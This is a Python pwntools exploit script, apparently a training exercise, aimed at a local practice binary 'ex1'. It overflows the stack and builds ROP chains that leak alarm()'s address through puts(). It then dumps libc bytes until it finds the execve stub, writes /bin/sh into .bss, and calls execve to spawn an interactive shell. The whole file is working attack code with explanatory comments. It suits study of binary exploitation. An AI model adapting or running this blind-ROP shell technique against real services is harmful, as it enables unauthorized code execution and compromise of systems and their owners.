################################################################################
# ex1-exploit.py
#   Chapter:02
#   Binary: ex1
#   Source: ex1.c
#   Goal:   spawm a shell by calling execve("/bin/sh\x00",NULL,NULL); This time,
#           though, the binary uses FullRelro so we cannot overwrite the got.
#           Because it provides us with a call to puts(), we are free to leak
#           data from the program. What we need to do is to find out where
#           execve() is located and use its address to gain a shell.
#
#           For this particular exercise, we are going to assume that the
#           binary is running on a live instance under a custom lic6 we do not
#           have, which makes really difficult to use the well-known techniques
#           to jump to system(), for example. Therefore, we are going to leak
#           code until finding the opcodes in the execve() stub that sets
#           0x3b into RAX; that address is where execve() is! (Assuming, of
#           course, that execve() has not been tampered with)
#
#           Because ex1 has Full RELRO enabled, you can't solve this exercise
#           using ret2dlresolve. Of course, supossing the libc6 is known,
#           you wouldn't need to do all this stuff! Just leak, compute base
#           address and so on... how boring!
################################################################################
from pwn import *

################################################################################
#   ropDumpMemory(addr):
#       Constructs and returns a ROP-chain that leaks what's at address "addr"
#       Returns back to main
################################################################################
def ropDumpMemory(addr):

    rop     =   b''
    rop     +=  p64(pop_rdi)
    rop     +=  p64(addr)                           # rdi <- addr
    rop     +=  p64(binary.symbols["plt.puts"])     # puts(*addr)
    rop     +=  p64(binary.symbols["main"])         # main();

    return rop

################################################################################
#   ropDisableAlarm()
#       Constructs and returns a ROP-chain that disables the alarm set by
#       main() by calling alarm(0);
################################################################################
def ropDisableAlarm():

    rop     =   b''
    rop     +=  p64(pop_rdi)
    rop     +=  p64(0x0)
    rop     +=  p64(binary.symbols['plt.alarm'])

    return  rop

################################################################################
# dumpBytes(start_addr,r):
#   dumps bytes from start_addr until finding \x3b\xb8 "mov eax,0x3b" and
#   returns the address where it was found
################################################################################
def dumpBytes(start_addr,r):

    # We are looking for "mov eax,0x3b":
    searchFor   =   b'\x3b\xb8'
    found   = False
    addr    = start_addr
    dumped  =   b''     # dumped bytes so far

    while found == False:

        warning("Dumping bytes from 0x%02x ... " % addr)

        # We try dumping some bytes until puts() stops due to a NULL-byte:
        r.send(padding + p64(RBP) + ropDisableAlarm() + ropDumpMemory(addr) + b'\x0a')

        # The dumped data will end at the first \x0a found (it's the new line
        # printed by puts()). We remove 'Feed' and the last byte inserted by puts().
        # If there's a \x0a at addr+offset after removing these bytes, it's a valid
        # byte stored at addr+offset!
        data = r.recvuntil(b'Feed')[:-5][::-1]
        # We discard the rest of the data:
        r.clean()

        # So we know that, at least, len(data) from addr are not null. If len(data)
        # is 0, means a NULL-byte. In this case, we can increase the address by 1
        # and add this NULL byte to the dumped bytes:
        if len(data) > 0:
            dumped  +=  data
            # Have we found it? We do not need to do this login when \x00:
            if dumped.find(searchFor) != -1:
                warning("mov eax,0x3b found at 0x%02x, dumped bytes %d" % ( addr, len(dumped)))
                return addr
            addr    +=  len(data)
        else:
            addr    +=  1
            dumped  +=  b'\x00'

        # There's still another caveat here; gets()! Gets reads up until finding
        # the \x0a or \x0d byte. That means that if we compute an address that has any
        # of its bytes set to \x0a, for example: 
        #   0x7fd43b1a7d0a
        # The address gets() will read will be invalid: 0x7fd43b1a7d0a and the
        # program will crash while dumping bytes.

# Binary protections:
# checksec --file ex1
#    Arch:     amd64-64-little
#    RELRO:    Full RELRO               We cannot overwrite the got
#    Stack:    No canary found          We can smash the stack as we please
#    NX:       NX enabled               We need ROP (stack is non-executable)
#    PIE:      No PIE (0x400000)        We don't need a memory leak
vuln    =   "./ex1"
binary  =   ELF(vuln)

# Default offset from alarm_addr to start dumping bytes from. You can override
# this value with OFFSET=n
if args.OFFSET:
    alarm_offt  =   int(args.OFFSET)
else:
    alarm_offt  =   3200
warning("We will start dumping bytes at offset: %d" % alarm_offt)

# We control EIP after padding + RBP:
padding =   b'A'*112
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
#0x00000000004011ac: pop rdi; ret;
#0x00000000004011b0: pop rdx; ret;
#0x00000000004011ae: pop rsi; ret;
pop_rdi =   0x04011ac
pop_rsi =   0x04011ae
pop_rdx =   0x04011b0

# We start a local process of the vulnerable program:
r = process(binary.path)

# This binary is not PIE; so we can use its addresses right away
# (we don't need a leak)

# The command we will end up writing to the .bss segment:
cmd =   b'/bin/sh\x00'

# We need to put "/bin/sh\x00" into rdi. The program calls "memset",
# so we need to write each character at a time into a valid rw-
# section. *mydata seems to be the right place to write to:
cmd_addr    =   binary.symbols["mydata"]
info("We will write /bin/sh into mydata at 0x%02x" % cmd_addr)

# First thing to do is to leak the address where alarm() is constructing
# a classic ROP-chain. This binary has Full RelRo and we are considering
# this is executed on a live instance with a custom libc (it's not true,
# obviously, but let's pretend!). So the offet of the leaked address will
# not yield anything using libc6-database.
r.send(padding + p64(RBP) + ropDumpMemory(binary.symbols["got.alarm"]) + b'\x0a')
r.recvline()
alarm_addr = int(r.recv(6)[::-1].hex(),16)
r.clean()
info("alarm() leaked! 0x%02x " % alarm_addr)

# Because we are "going blind", let's assume the implementation of the execve()
# stub on the live instance has not been modified in any way. All we need to do
# is to located where it is! The offsets may not be the expected ones, but execve() 
# will be relative close to alarm() anyways.
#
# For example:
#   gef➤  p/d execve - alarm
#   $5 = 3504
#
#   3504 bytes away seems affordable if we are going to be dumping bytes from
#   alarm_addr until reaching the opcodes "mov eax, 0x3b" of the execve() libc6
#   stub:
#
# ┌ 33: sym.execve ();
# │           0x000d4910      b83b000000     mov eax, 0x3b               ; ';'
# │           0x000d4915      0f05           syscall
#
# We have to solve a problem will encounter though: the NULL bytes. Please notice
# that, for example, the first instruction of execve has NULL-bytes. We may encounter
# more NULL-bytes between alarm_addr and mov eax,0x3b too! So our dumpBytes ROP-chain
# should take that into account. Because the program uses puts() to print data to
# stdout, we read its manpage:
#
#       puts() writes the string s and a trailing newline to stdout.
#       fputs() writes the string s to stream, without its terminating null byte ('\0').
#
#   So it stops outputting data once a NULL-byte is reached and it always end with a
#   new line byte (\x0a). Knowing this, we implement our dumpBytes method (see dumpBytes)
# We do not need to start dumping bytes from alarm_addr, we can start a bit far away knowing
# the offset will be relative close to the one we have in our local version:
execve_addr =   dumpBytes(alarm_addr+alarm_offt,r)

# Now, we can write our command to the .bss section as usual:
# We can set RDX = 1 just once, so we do it outside the loop:
rop =   b''
rop +=  p64(pop_rdx)
rop +=  p64(0x01)                               # rdx <- 0x1
for i in range(0,len(cmd)):
    rop +=  p64(pop_rdi)
    rop +=  p64(cmd_addr+i)                     # rdi <- &mydata[i]
    rop +=  p64(pop_rsi)
    rop +=  p64(cmd[i])                         # rsi <- char
    rop +=  p64(binary.symbols["plt.memset"])   # memset(&mydata[i],cmd[i],1)

# Please notice that we can also use plt.gets(cmd_addr) in order to write
# any string of our choice into cmd_addr. This way, we do not need to iterate
# and the payload will execute faster.

# Now we disable alarm() - not really necessary , but it will gives us more
# time once we have a shell - :
rop     +=  ropDisableAlarm()

# This time we do not need to set RAX == 0x3b explicitaly; we just set the
# arguments to execve() as before and then we return directly to the execve()
# stub address retrived by dumping bytes:
rop     +=  p64(pop_rdi)
rop     +=  p64(cmd_addr)       # rdi <- &"/bin/sh\x00"
rop     +=  p64(pop_rsi)
rop     +=  p64(0x0)            # char **argp[] = NULL;
rop     +=  p64(pop_rdx)
rop     +=  p64(0x0)            # char **envp[] = NULL;
rop     +=  p64(execve_addr)    # execve("/bin/sh\x00",NULL,NULL);
r.send(padding + p64(RBP) + rop + b'\x0a')
r.interactive()
r.close()
